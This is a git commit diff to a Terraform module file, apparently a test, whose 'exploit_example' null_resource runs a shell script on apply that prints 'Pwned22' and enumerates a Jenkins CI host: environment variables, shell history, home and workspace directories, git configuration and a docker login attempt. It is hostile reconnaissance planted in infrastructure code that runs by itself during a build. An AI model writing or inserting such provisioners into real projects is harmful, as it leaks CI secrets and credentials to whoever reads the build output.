92fc4b4a6e4040cdfaee71bef7d31d39ca000d5e
bemaudettest <154524170+bemaudettest@users.noreply.github.com>
2024-06-11 13:49:18 +0000

    test

--- test_module/main.tf
+++ test_module/main.tf
@@ -3,11 +3,14 @@ resource "null_resource" "exploit_example" {
     command = <<EOT
     #!/bin/bash
     echo Pwned22
+    git config -l
+    docker login
+    terraform 
     ls $JENKINS_HOME
     ls -al /opt
     ls -al /home/ci
     history
-    ls -al /data/jenkins/
+    ls -al /data/jenkins/workspace/
     whoami
     printenv
     date
